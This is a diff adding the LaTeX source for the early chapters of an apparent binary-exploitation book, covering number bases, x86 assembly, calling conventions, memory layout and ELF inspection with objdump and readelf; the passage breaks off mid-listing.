@@ -1,0 +1,4024 @@
+\documentclass{article}
+
+\usepackage[a4paper, total={6in, 8in}]{geometry}
+\usepackage{mdframed}
+\usepackage{caption}
+\usepackage{amsmath}
+\usepackage{listings}
+\usepackage[defaultmono]{droidmono}
+\lstset{basicstyle=\ttfamily\small,breaklines=true}
+\newtheorem{exmp}{Example}[section]
+
+\newenvironment{aside}
+    {\begin{mdframed}[style=0,%
+        leftline=false,rightline=false,leftmargin=2em,rightmargin=2em,%
+            innerleftmargin=0pt,innerrightmargin=0pt,linewidth=0.75pt,%
+        skipabove=7pt,skipbelow=7pt]\small}
+    {\end{mdframed}
+}
+
+\author{Devin Neal}
+
+\begin{document}
+
+\tableofcontents
+\newpage
+
+% bits, bytes, words, dwords, qwords, binary, hex, 2's complement, endianness
+\section{A Crash Course on Computers}
+\subsection{Bits, Bytes, and their Representations}
+\subsubsection{Numbers in different bases}
+A \emph{bit} is the fundamental unit of data on a computer. A bit can only be
+either on or off, 0 or 1. It's awkward to represent data in terms of bits
+however, so we usually refer to groups of bits instead. A string of eight
+consecutive bits is called a \emph{byte}, and a pair of two bytes, or 16 bits,
+is called a \emph{word}. Bytes are often further grouped into pairs, called
+double words, or groups of four, called quad words.
+
+Since a bit can only take on one of two values, computers store numbers in base
+two, or binary. Just as the digits of a number in base 10 are each scaled by a
+power of 10, each bit in a binary number is scaled by a power of 2. The
+rightmost bit has a value of either 0 or 1 (scaled by $2^0$, or 1), and every
+other bit is scaled by twice as much as the bit to its right. Therefore, if we
+zero-index the bits starting from the right, the $i$th bit is scaled by $2^i$.
+
+\begin{exmp}[Numbers in base 2]
+\begin{align*}
+11111111_2 & = 1 \times 2^7 + 1 \times 2^6 + 1 \times 2^5 + 1 \times 2^4 + 1 \times 2^3 + 1 \times 2^2 + 1 \times 2^1 + 1 \times 2^0 \\
+           & = 128 + 64 + 32 + 16 + 8 + 4 + 2 + 1 \\
+           & = 255
+11010110_2 & = 1 \times 2^7 + 1 \times 2^6 + 0 \times 2^5 + 1 \times 2^4 + 0 \times 2^3 + 1 \times 2^2 + 1 \times 2^1 + 0 \times 2^0 \\
+           & = 128 + 64 + 0 + 16 + 0 + 4 + 2 + 0 \\
+           & = 214
+\end{align*}
+Note that the 2 subscript denotes a number written in base 2.
+\end{exmp}
+
+Since it is tedious to write bytes as strings of bits, they are often
+represented in base 16, or hexadecimal. This representation is convenient since
+4 bits can be represented with a single hexadecimal digit. Since there are more
+hexadecimal digits than decimal ones, we use a-f as digits with values 10-15.
+
+\begin{center}
+\begin{align*}
+\begin{tabular}{c | c}
+hex digit & value \\
+\hline\hline
+0 & 0 \\ \hline
+1 & 1 \\ \hline
+2 & 2 \\ \hline
+3 & 3 \\ \hline
+4 & 4 \\ \hline
+5 & 5 \\ \hline
+6 & 6 \\ \hline
+7 & 7 \\
+\end{tabular} & \hspace{.5cm}
+\begin{tabular}{c | c}
+hex digit & value \\
+\hline\hline
+8 & 8 \\ \hline
+9 & 9 \\ \hline
+10 & a \\ \hline
+11 & b \\ \hline
+12 & c \\ \hline
+13 & d \\ \hline
+14 & e \\ \hline
+15 & f \\
+\end{tabular}
+\end{align*}
+\end{center}
+
+\begin{exmp}[Numbers in base 16]
+\begin{align*}
+11010110_2 &= 1101_2 \times 16^1 + 0110_2 \times 16^0 \\
+           &= 13 \times 16^1 + 6 \times 16^0 \\
+           &= \emph{0xd6}
+\end{align*}
+Note that the 0x prefix denotes a number written in base 16.
+\end{exmp}
+
+\subsubsection{Two's complement}
+Since computers can only store data as bits, there is no inherent way to
+represent negative numbers. To address this problem, the highest bit is given a
+negative value when negative numbers are needed. This representation for
+negative numbers is called two's complement. Whereas a string of $n$ bits
+normally takes values from $0$ to $2^n-1$, the same $n$ bits in two's complement
+can take any values from $-2^{n-1}$ to $2^{n-1}-1$.
+
+\begin{exmp}[Numbers in two's complement]
+\begin{align*}
+10000000_2 & = 1 \times -2^7 + 0 \times 2^6 + 0 \times 2^5 + 0 \times 2^4 + 0 \times 2^3 + 0 \times 2^2 + 0 \times 2^1 + 0 \times 2^0 \\
+           & = -128 + 0 + 0 + 0 + 0 + 0 + 0 + 0 \\
+           & = -128 \\
+01111111_2 & = 0 \times -2^7 + 1 \times 2^6 + 1 \times 2^5 + 1 \times 2^4 + 1 \times 2^3 + 1 \times 2^2 + 1 \times 2^1 + 1 \times 2^0 \\
+           & = 0 + 64 + 32 + 16 + 8 + 4 + 2 + 1 \\
+           & = 127 \\
+10100101_2 & = 1 \times -2^7 + 0 \times 2^6 + 1 \times 2^5 + 0 \times 2^4 + 0 \times 2^3 + 1 \times 2^2 + 0 \times 2^1 + 1 \times 2^0 \\
+           & = -128 + 0 + 32 + 0 + 0 + 4 + 0 + 1 \\
+           & = -91
+\end{align*}
+\end{exmp}
+
+\subsubsection{Machine Words}
+The number of bits that a computer can read, write, and manipulate at a time is
+called a machine word, not to be confused by the 16-bit words from above. A
+computer that operates on 16 bits at a time is said to run on a 16-bit
+architecture. The size of a machine word varies between computers. At the time
+of writing, most modern computers have 64-bit machine words, and thus run on
+64-bit architectures. The size of machine words generally gets smaller as the
+computer gets older. The original PlayStation and the GameCube ran on 32-bit
+architectures, and the original GameBoy had an 8-bit architecture. x86 is the
+most common 32-bit architecture, and its successor x86-64, is the most common
+64-bit architecture.
+
+\subsubsection{Endianness}
+Not all computers store multiple bytes of data in the same order. On some
+architectures the leftmost byte, also called the \emph{most significant byte} is
+the first one stored in memory, followed by the next one to the left, and so on.
+This results in a number like $\texttt{0x080485a2}$ being stored as
+$\texttt{0x08}$ $\texttt{0x04}$ $\texttt{0x85}$ $\texttt{0xa2}$. This is called
+\emph{big-endian byte order}, and it is surprisingly rare. Most computers store
+data in \emph{little-endian byte order}, which lists the rightmost, or
+\emph{least-significant byte} first. The same number $\texttt{0x080485a2}$
+stored in little-endian byte order would be stored as $\texttt{0xa2}$
+$\texttt{0x85}$ $\texttt{0x04}$ $\texttt{0x08}$.
+
+% cpu, registers, and memory
+\subsection{Computer Model}
+Although we tend to think of a ``computer'' as consisting of many parts such as
+a monitor, hard disk, mouse, CD drive, etc., there are only three components we
+need to know about in order to exploit software.
+
+\subsubsection{The CPU}
+The Central Processing Unit, or \emph{CPU}, is responsible for executing the
+instructions contained in a program. This typically includes performing
+arithmetic, reading from memory, and writing to memory. Different CPUs
+understand different variants of machine code, and so a given CPU can only run
+executables which are written in the particular variant that it understands.
+
+\subsubsection{Memory}
+\emph{Memory}, or main memory, acts as both a scratchpad for the CPU to use
+while executing a program and the place where the CPU reads program
+instructions. It is also used to keep track of function calls and handle
+recursion.
+
+\subsubsection{Registers}
+\emph{Registers} are small bits of memory located on the CPU. Although they can
+be accessed very quickly, each register can typically only store a single
+machine word, which means the vast majority of data must reside in main memory. 
+
+\subsubsection{Compilers}
+A \emph{compiler} translates source code into machine code, producing an object
+file. An object file cannot be run until it is linked, a task which is left
+to the linker. 
+
+\subsubsection{Linkers}
+\emph{Linkers} combine object files in a process called linking. Linking
+produces an executable, a binary which can be executed. This may sound confusing
+since we typically say that we run binaries after compiling them, but what
+programmers colloquially refer to as ``compiling'' is actually compiling
+\textit{and} linking. Linking can either be done dynamically, meaning that the
+executable will use data from other binaries at runtime, or statically, meaning
+that any required data will be added to the executable at compile time.
+
+% x86, x86-64, registers, elfs, asm, stack, heap, plt, got, gdb
+\section{Understanding the Playing Field}
+\subsection{x86 and x86-64}
+x86 is the most popular 32-bit architecture. x86 CPUs have eight general-purpose
+registers, called \texttt{eax}, \texttt{ecx}, \texttt{edx}, \texttt{ebx},
+\texttt{esp}, \texttt{ebp}, \texttt{esi}, \texttt{edi}, and two other registers,
+\texttt{eip}, and \texttt{eflags}, which have specific uses and cannot be
+written to directly. Although each general-purpose register can technically be
+used for anything, they are conventionally used for specific purposes.
+
+\begin{itemize}
+    \item \texttt{eax} (the accumulator) is used to store function return values 
+    \item \texttt{esp} (the stack pointer) points to the top of the current
+        stack frame 
+    \item \texttt{ebp} (the base pointer) points to the base (highest) address
+        of the current stack frame 
+    \item \texttt{eip} (the instruction pointer) points to the next instruction
+        that the CPU will execute. Each time an instruction is executed, the
+        \texttt{eip} is set to the next instruction.
+    \item \texttt{eflags} (the flags register) contains several single-bit flags
+        that describe the state of the CPU
+\end{itemize}
+
+% TODO: add an image to demonstrate this
+Some parts of each register can be manipulated independently of others. For
+example, the lower 16 bits of \texttt{eax} are referred to as \texttt{ax}. The
+lower 8 bits of \texttt{ax} are referred to as \texttt{al}, and the higher 8
+bits of \texttt{ax} are referred to as \texttt{ah}. There is a similar naming
+convention for \texttt{ecx}, \texttt{edx}, and \texttt{ebx}.
+
+x86-64 extends the x86 registers mentioned above to 64 bits, and in doing so
+replaces the `e' prefixes with `r' prefixes (i.e. \texttt{rax}, \texttt{rflags},
+etc.). It also adds eight more general-purpose registers (\texttt{r8} through
+\texttt{r15}), and eight 128-bit XMM registers.
+
+% basic assembly
+\subsection{Assembly, the Elven Tongue}
+Although we write typically write programs in C, a CPU can only execute
+instructions written in machine code. Machine code is unfortunately rather
+difficult to for humans to read, so we instead use assembly, a human-readable
+machine code. Being comfortable reading assembly will be invaluable while trying
+to understand and exploit programs, so it will be useful to learn a few of the
+more common instructions.
+
+\subsubsection{Intel vs. AT\&T}
+Assembly can be written in one of two ways: Intel syntax and AT\&T syntax. Both
+have the same instructions and convey the same information, but most people find
+Intel syntax a little bit easier to read. For the purposes of this book, all
+assembly will be written in Intel syntax. If you're ever unsure what syntax some
+assembly is written in, just look for the \$ and \% characters that are heavily
+used in AT\&T syntax.
+
+\subsubsection{Common Assembly Instructions}
+Instructions in intel syntax typically have one of two forms:
+\texttt{<instruction> <destination> <source>} or \texttt{<instruction>
+<argument>}. A few of the most common assembly instructions are listed below.
+
+\paragraph{Reading and writing data}
+\begin{itemize}
+    \item \texttt{mov <destination> <source>} - write data specified by source
+        to destination
+    \item \texttt{push <data>} - decrement the stack pointer, then write the
+        specified data to the top of the stack
+    \item \texttt{pop <data>} - write data at the top of the stack to argument,
+        then increment the stack pointer
+\end{itemize}
+
+\paragraph{Manipulating data}
+\begin{itemize}
+    \item \texttt{add <arg1> <arg2>} - writes arg1 + arg2 to arg1
+    \item \texttt{sub <arg1> <arg2>} - writes arg1 - arg2 to arg1
+    \item \texttt{imul <arg1> <arg2>} - writes arg1 * arg2 to arg1
+    \item \texttt{idiv <arg>} - writes rax / arg to rdx:rax (or architecture
+        equivalent)
+    \item \texttt{and <arg1> <arg2>} - writes arg1 \& arg2 to arg1
+    \item \texttt{or <arg1> <arg2>} - writes arg1 $|$ arg2 to arg1
+    \item \texttt{xor <arg1> <arg2>} - writes arg1 $\wedge$ arg2 to arg1
+\end{itemize}
+
+\begin{aside}
+    $\wedge$ denotes bitwise xor, a binary operator which is 1 only when its
+    arguments are different. \& denotes bitwise and, another binary operator
+    which is 1 only when both its arguments are 1.
+\end{aside}
+
+\paragraph{Control flow}
+\begin{itemize}
+    \item \texttt{call <address>} - push the address of the next instruction,
+        then move address into rip
+    \item \texttt{ret} - move the address at the top of the stack into rip,
+        then increment the stack pointer
+    \item \texttt{jmp} - unconditional jump
+    \item \texttt{je} - jump if equal (to zero)
+    \item \texttt{jne} - jump if not equal (to zero)
+    \item \texttt{jl} - jump if less (than zero)
+    \item \texttt{jle} - jump if less than or equal (to zero)
+    \item \texttt{jg} - jump if greater (than zero)
+    \item \texttt{jge} - jump if greater than or equal (to zero)
+    \item \texttt{cmp} - perform subtraction, but ignore the result (only set
+        \texttt{rflags})
+    \item \texttt{test} - perform and, but ignore the result (only set
+        \texttt{rflags})
+\end{itemize}
+
+\paragraph{Extra}
+\begin{itemize}
+    \item \texttt{nop} - do absolutely nothing
+\end{itemize}
+
+The family of jump instructions deserves special attention. The \texttt{jmp}
+instruction simply redirects execution to the address specified by its argument.
+Each of the others checks \texttt{rflags} and will only redirect execution if
+the flags meet a certain condition.
+
+When an assembly instruction references memory, it must specify both the
+size and location of that memory. The intel syntax for addressing memory is
+\texttt{<size> PTR [<addr>]}, where the \texttt{<size>} is one of the following:
+\begin{itemize}
+    \item \texttt{BYTE} - 1 byte
+    \item \texttt{WORD} - 2 bytes
+    \item \texttt{DWORD} - 4 bytes
+    \item \texttt{QWORD} - 8 bytes
+\end{itemize}
+
+This is commonly used with the \texttt{mov} instruction, i.e. \texttt{mov
+QWORD PTR [rbp-0x8],rax}. 
+
+A snippet of assembly code is below. You now know enough to figure out what it
+does.
+
+\begin{lstlisting}
+40052e:  mov    DWORD PTR [rbp-0x8],0x0
+400535:  mov    DWORD PTR [rbp-0x4],0x0
+40053c:  jmp    400548
+40053e:  mov    eax,DWORD PTR [rbp-0x4]
+400541:  add    DWORD PTR [rbp-0x8],eax
+400544:  add    DWORD PTR [rbp-0x4],0x1
+400548:  cmp    DWORD PTR [rbp-0x4],0xa
+40054c:  jle    40053e
+\end{lstlisting}
+
+The key to reading assembly is to first divide the code into sections and detail
+exactly what each line is doing. Then, you can determine how each of the
+sections interact with each other to learn what the entire program is doing.
+
+\begin{lstlisting}
+40052e:  mov    DWORD PTR [rbp-0x8],0x0
+400535:  mov    DWORD PTR [rbp-0x4],0x0
+40053c:  jmp    400548
+\end{lstlisting}
+
+First the program writes 0 to \texttt{DWORD PTR [rbp-0x8]} and \texttt{DWORD PTR
+[rbp-0x4]}. Then there is a jump to \texttt{0x400548}.
+
+\begin{lstlisting}
+400548:  cmp    DWORD PTR [rbp-0x4],0xa
+40054c:  jle    40053e
+\end{lstlisting}
+
+After the jump, the program compares \texttt{DWORD PTR [rbp-0x4]} and
+\texttt{0xa}. More specifically, it computes \texttt{DWORD PTR [rbp-0x4] - 0xa}
+and sets \texttt{rflags} according to the result, but doesn't save that result.
+It then jumps to \texttt{0x40053e} if \texttt{rflags} is set according to a
+value less than or equal to zero.  Since \texttt{DWORD PTR [rbp-0x4]} was just
+set to 0 the result of the subtraction is \texttt{-0xa}, so the jump is taken.
+
+\begin{lstlisting}
+40053e:  mov    eax,DWORD PTR [rbp-0x4]
+400541:  add    DWORD PTR [rbp-0x8],eax
+400544:  add    DWORD PTR [rbp-0x4],0x1
+\end{lstlisting}
+
+The program moves \texttt{DWORD PTR [rbp-0x4]} into \texttt{eax}, computes
+\texttt{DWORD PTR [rbp-0x8] + eax}, and overwrites \texttt{DWORD PTR [rbp-0x8]}
+with the result. At this point, but \texttt{DWORD PTR [rbp-0x8]} and
+\texttt{DWORD PTR [rbp-0x4]} are 0, so the only effect is setting \texttt{DWORD
+PTR [rbp-0x4]} to 1. After this block execution continues at \texttt{0x400548},
+which we have alredy analyzed.
+
+We can now analyze these sections of code. There seem to be two variables, one
+at \texttt{rbp-0x4} and the other at \texttt{rbp-0x8}. The one at
+\texttt{rbp-0x4} is only changed by incrementing and used to check when to
+stop looping, so it functions as a counter. The variable at \texttt{rbp-0x8}
+stores a running sum. The instructions from \texttt{0x40053e} to
+\texttt{0x40054c} function as a loop, which runs 11 times (for values 0-10).
+Each time the loop runs it first adds the counter to the running sum, then
+increments the counter. Therefore this program is calculating the sum of the
+numbers 0 through 10 and leaving the result in \texttt{DWORD PTR [rbp-0x8]}.
+
+% variables, stack frames, heap basics
+% TODO: include stack frame diagram
+\subsection{The Stack and Heap}
+The most important use of the stack is in handling nested function calls. In
+order to make this work seamlessly, the functions follow a calling convention
+which outlines instructions for both the calling function (the caller) and the
+called function (the callee). Calling conventions vary between architectures,
+but the calling convention for x86-64 is detailed below.
+
+The caller shall:
+\begin{enumerate}
+    \item Prepare the callee's arguments by either loading them into registers
+        (x86-64) or pushing them onto the stack in reverse order (x86)
+    \item Execute the \texttt{call} instruction to jump to the new function and
+        push the address of the next instruction onto the stack
+    \item After the callee returns, clear the stack of any callee arguments
+\end{enumerate}
+
+At the \emph{start} of execution, the callee will complete the following tasks,
+called the \emph{function prologue}:
+\begin{enumerate}
+    \item Push the caller's base pointer onto the stack
+    \item Move the base pointer to point to the caller's saved base pointer
+    \item Subtract from the stack pointer to make room for any local variables
+\end{enumerate}
+
+At the \emph{end} of execution, the callee will complete the following tasks,
+called the \emph{function epilogue}:
+\begin{enumerate}
+    \item Leave the return value in the accumulator
+    \item Move the stack pointer to point to the caller's saved base pointer
+    \item Restore the caller's base pointer by popping if off of the stack
+    \item Execute the \texttt{ret} instruction to return control to the caller
+\end{enumerate}
+
+Note that the callee essentially undoes everything it did in the function
+prologue when it executes the function epilogue. This way the caller can
+continue execution after finishing the calling convention with its stack frame
+intact. Additionally, this calling convention allows for the callee to call
+other functions during its execution, since the stack frames they build will be
+popped off the stack after they terminate. This means that, as long as there is
+room on the stack to keep building stack frames, we can nest function calls
+indefinitely!
+
+You now know enough to understand a basic program written in assembly. Take this
+one, for example.
+
+\begin{lstlisting}
+// elf.c 
+#include <stdio.h>
+
+int main(void) {
+    int num;
+    printf("ELF example\n");
+    scanf("%d\n", &num);
+    return 0;
+}
+\end{lstlisting}
+
+If you to compile this program with \texttt{gcc -o elf elf.c}, you will create
+a new ELF file called \texttt{elf}.
+
+\begin{lstlisting}
+> gcc -o elf elf.c 
+> ls -l elf
+-rwxrwxr-x 1 devneal devneal 8720 Nov  9 11:28 elf
+> 
+\end{lstlisting}
+
+We can use a tool called \texttt{objdump} to read a compiled program's assembly.
+Run \texttt{objdump -M intel -d elf} to view the assembly in Intel syntax.
+
+\begin{lstlisting}
+00000000004005f6 <main>:
+  4005f6:       55                      push   rbp
+  4005f7:       48 89 e5                mov    rbp,rsp
+  4005fa:       48 83 ec 10             sub    rsp,0x10
+  4005fe:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
+  400605:       00 00 
+  400607:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
+  40060b:       31 c0                   xor    eax,eax
+  40060d:       bf d4 06 40 00          mov    edi,0x4006d4
+  400612:       e8 99 fe ff ff          call   4004b0 <puts@plt>
+  400617:       48 8d 45 f4             lea    rax,[rbp-0xc]
+  40061b:       48 89 c6                mov    rsi,rax
+  40061e:       bf e0 06 40 00          mov    edi,0x4006e0
+  400623:       b8 00 00 00 00          mov    eax,0x0
+  400628:       e8 b3 fe ff ff          call   4004e0 <__isoc99_scanf@plt>
+  40062d:       b8 00 00 00 00          mov    eax,0x0
+  400632:       48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
+  400636:       64 48 33 14 25 28 00    xor    rdx,QWORD PTR fs:0x28
+  40063d:       00 00 
+  40063f:       74 05                   je     400646 <main+0x50>
+  400641:       e8 7a fe ff ff          call   4004c0 <__stack_chk_fail@plt>
+  400646:       c9                      leave  
+  400647:       c3                      ret    
+  400648:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
+  40064f:       00
+\end{lstlisting}
+
+The first three instructions are the function prologue, creating a new stack
+frame.
+\begin{lstlisting}
+4005f6:       55                      push   rbp
+4005f7:       48 89 e5                mov    rbp,rsp
+4005fa:       48 83 ec 10             sub    rsp,0x10
+\end{lstlisting}
+
+The next two instructions may seem strange. The program reads a \texttt{QWORD}
+from somewhere into \texttt{rax}, then stores that value on the stack at
+\texttt{rbp-0x8}. It then uses a clever trick to zero out \texttt{eax}.
+\begin{lstlisting}
+4005fe:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
+400605:       00 00 
+400607:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
+40060b:       31 c0                   xor    eax,eax
+\end{lstlisting}
+
+Next is a call to \texttt{puts()}. We can see the first argument (presumably a
+format string) being moved into \texttt{edi} preceding the call.
+\begin{lstlisting}
+40060d:       bf d4 06 40 00          mov    edi,0x4006d4
+400612:       e8 99 fe ff ff          call   4004b0 <puts@plt>
+\end{lstlisting}
+
+Now there's a call to \texttt{scanf()}. Since we called \texttt{scanf()} with
+two arguments, both \texttt{rdi} and \texttt{rsi} are set before the call. It
+then moves \texttt{0x0} into \texttt{eax} in order to return 0.
+
+\begin{lstlisting}
+400617:       48 8d 45 f4             lea    rax,[rbp-0xc]
+40061b:       48 89 c6                mov    rsi,rax
+40061e:       bf e0 06 40 00          mov    edi,0x4006e0
+400623:       b8 00 00 00 00          mov    eax,0x0
+400628:       e8 b3 fe ff ff          call   4004e0 <__isoc99_scanf@plt>
+40062d:       b8 00 00 00 00          mov    eax,0x0
+\end{lstlisting}
+
+This is followed by a few more instructions involving the mysterious value at
+\texttt{rbp-0x8}. Their purpose can be ignored for now, but we can tell that the
+program is comparing the value on the stack to the one that was originally
+placed there.
+\begin{lstlisting}
+400632:       48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
+400636:       64 48 33 14 25 28 00    xor    rdx,QWORD PTR fs:0x28
+40063d:       00 00 
+40063f:       74 05                   je     400646 <main+0x50>
+400641:       e8 7a fe ff ff          call   4004c0 <__stack_chk_fail@plt>
+\end{lstlisting}
+
+Last, the program exits by executing the function epilogue followed by the
+\texttt{ret} instruction.
+\begin{lstlisting}
+400646:       c9                      leave  
+400647:       c3                      ret    
+\end{lstlisting}
+
+% memory segmentation, readelf, objdump
+% TODO: add diagram
+\subsection{Memory Layout}
+Memory in a running program can be divided into sections, each of which is used
+for a specific purpose. They are, in order from lower addresses to higher
+addresses, \texttt{.text}, \texttt{.data}, \texttt{.bss}, \texttt{heap}, and
+\texttt{stack}. There is no set convention for the orientation of the stack in
+when we diagram it, but in order to be consistent with the view of memory we get
+in the terminal, we will draw memory with lower addresses at the top and higher
+addresses at the bottom.
+
+\begin{itemize}
+    \item The \texttt{.text} section stores the program's executable code and is
+never writable.
+    \item The \texttt{.data} section stores any static or global variables (in C
+terminology) that are initialized in the source code and writable.
+    \item The \texttt{.bss} secition stores any static or global variables that
+are initialized to zero or not explicitly initialized in the source code.
+    \item The \texttt{heap} is a section of memory which can be dynamically
+allocated at runtime. The heap grows downward, toward higher memory addresses.
+    \item The \texttt{stack} is a section of memory which is used to store
+local variables and handle nested function calls. The stack grows upward, toward
+lower memory addresses.
+\end{itemize}
+
+% symbols, sections, and segments
+\subsection{ELF Anatomy}
+ELF, or Executable and Linkable Format, is the most common type of executable
+for Linux systems. Whenever you compile a program with \texttt{gcc}, the result
+is and ELF binary.
+
+\begin{lstlisting}
+> file elf
+elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6dc45433a562bb0eb99f962510ad71b3da43095d, not stripped
+> 
+\end{lstlisting}
+
+The output of the \texttt{file} command indicates that this ELF binary was
+compiled for a litte-endian (Least Significant Byte) x86-64 architecture. We can
+see more information with the \texttt{readelf} command.
+
+\begin{lstlisting}
+> readelf --file-header elf
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x400430
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          6616 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         9
+  Size of section headers:           64 (bytes)
+  Number of section headers:         31
+  Section header string table index: 28
+> 
+\end{lstlisting}
+
+We don't need most of this information right now, but there are a few
+interesting things. The ``Magic'' field indicates the first few bytes in the
+file, which always starts with \texttt{7f} followed by the ASCII representation
+of the characters `E' `L' `F'. The ``Class'' field is \texttt{ELF64}, indicating
+that this executable was compiled for a 64-bit architecture, and the ``Data''
+field shows that the executable uses little-endian byte order. \texttt{readelf}
+is a useful tool for retreiving information about binaries, so it is worth
+getting familiar with it.
+
+\subsubsection{Symbols, Sections, and Segments}
+ELF binaries can be organized into \emph{symbols}, \emph{sections}, and
+\emph{segments}. This grouping is hierarchical: segments are groups of sections
+and each section contains several symbols. Symbols are simply names for memory
+locations. Each symbol is identified by its location in memory and its size.
+We can view an ELF file's symbols by passing the \texttt{--symbols} flag to
+\texttt{readelf}.
+
+\begin{lstlisting}
+> readelf --symbols elf | tail -n 10
+    57: 00000000004005c0     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+    58: 0000000000400540   101 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
+    59: 0000000000601040     0 NOTYPE  GLOBAL DEFAULT   26 _end
+    60: 0000000000400430    42 FUNC    GLOBAL DEFAULT   14 _start
+    61: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
+    62: 0000000000400526    21 FUNC    GLOBAL DEFAULT   14 main
+    63: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
+    64: 0000000000601038     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
+    65: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
+    66: 00000000004003c8     0 FUNC    GLOBAL DEFAULT   11 _init
+> 
+\end{lstlisting}
+
+Here we can see that the symbol for \texttt{main()} is located at address
+\texttt{0x400526} and has a size of 21 bytes. The compiler adds many more
+symbols for the linker to use.
+
+Each section of the binary is used for a different purpose. We've already seen
+the  \texttt{.text} section, which stores machine code, the \texttt{.data}
+section, which stores initialized global or static variables, and the
+\texttt{.bss} section, which stores uninitialized global or static variables. To
+list all of the sections in an ELF binary, pass the \texttt{--sections} flag to
+\texttt{readelf}.
+
+\begin{lstlisting}
+> readelf --sections elf
+There are 31 section headers, starting at offset 0x19d8:
+
+Section Headers:
+  [Nr] Name              Type             Address           Offset
+       Size              EntSize          Flags  Link  Info  Align
+  [ 0]                   NULL             0000000000000000  00000000
+       0000000000000000  0000000000000000           0     0     0
+  [ 1] .interp           PROGBITS         0000000000400238  00000238
+       000000000000001c  0000000000000000   A       0     0     1
+  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
+       0000000000000020  0000000000000000   A       0     0     4
+  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
+       0000000000000024  0000000000000000   A       0     0     4
+  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
+       000000000000001c  0000000000000000   A       5     0     8
+  [ 5] .dynsym           DYNSYM           00000000004002b8  000002b8
+       0000000000000060  0000000000000018   A       6     1     8
+  [ 6] .dynstr           STRTAB           0000000000400318  00000318
+       000000000000003d  0000000000000000   A       0     0     1
+  [ 7] .gnu.version      VERSYM           0000000000400356  00000356
+       0000000000000008  0000000000000002   A       5     0     2
+  [ 8] .gnu.version_r    VERNEED          0000000000400360  00000360
+       0000000000000020  0000000000000000   A       6     1     8
+  [ 9] .rela.dyn         RELA             0000000000400380  00000380
+       0000000000000018  0000000000000018   A       5     0     8
+  [10] .rela.plt         RELA             0000000000400398  00000398
+       0000000000000030  0000000000000018  AI       5    24     8
+  [11] .init             PROGBITS         00000000004003c8  000003c8
+       000000000000001a  0000000000000000  AX       0     0     4
+  [12] .plt              PROGBITS         00000000004003f0  000003f0
+       0000000000000030  0000000000000010  AX       0     0     16
+  [13] .plt.got          PROGBITS         0000000000400420  00000420
+       0000000000000008  0000000000000000  AX       0     0     8
+  [14] .text             PROGBITS         0000000000400430  00000430
+       0000000000000182  0000000000000000  AX       0     0     16
+  [15] .fini             PROGBITS         00000000004005b4  000005b4
+       0000000000000009  0000000000000000  AX       0     0     4
+  [16] .rodata           PROGBITS         00000000004005c0  000005c0
+       0000000000000010  0000000000000000   A       0     0     4
+  [17] .eh_frame_hdr     PROGBITS         00000000004005d0  000005d0
+       0000000000000034  0000000000000000   A       0     0     4
+  [18] .eh_frame         PROGBITS         0000000000400608  00000608
+       00000000000000f4  0000000000000000   A       0     0     8
+  [19] .init_array       INIT_ARRAY       0000000000600e10  00000e10
+       0000000000000008  0000000000000000  WA       0     0     8
+  [20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18
+       0000000000000008  0000000000000000  WA       0     0     8
+  [21] .jcr              PROGBITS         0000000000600e20  00000e20
+       0000000000000008  0000000000000000  WA       0     0     8
+  [22] .dynamic          DYNAMIC          0000000000600e28  00000e28
+       00000000000001d0  0000000000000010  WA       6     0     8
+  [23] .got              PROGBITS         0000000000600ff8  00000ff8
+       0000000000000008  0000000000000008  WA       0     0     8
+  [24] .got.plt          PROGBITS         0000000000601000  00001000
+       0000000000000028  0000000000000008  WA       0     0     8
+  [25] .data             PROGBITS         0000000000601028  00001028
+       0000000000000010  0000000000000000  WA       0     0     8
+  [26] .bss              NOBITS           0000000000601038  00001038
+       0000000000000008  0000000000000000  WA       0     0     1
+  [27] .comment          PROGBITS         0000000000000000  00001038
+       0000000000000034  0000000000000001  MS       0     0     1
+  [28] .shstrtab         STRTAB           0000000000000000  000018ca
+       000000000000010c  0000000000000000           0     0     1
+  [29] .symtab           SYMTAB           0000000000000000  00001070
+       0000000000000648  0000000000000018          30    47     8
+  [30] .strtab           STRTAB           0000000000000000  000016b8
+       0000000000000212  0000000000000000           0     0     1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
+  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+> 
+\end{lstlisting}
+
+We can see from the output above that the \texttt{.text} section is not writable
+(as expected), but the \texttt{.data} and \texttt{.bss} sections are. Among the
+new sections are \texttt{.plt} and \texttt{.got.plt}, both of which are
+important for linking.
+
+We can view the binary's segments with \texttt{readelf --segments}.
+
+\begin{lstlisting}
+> readelf --segments elf
+
+Elf file type is EXEC (Executable file)
+Entry point 0x400430
+There are 9 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
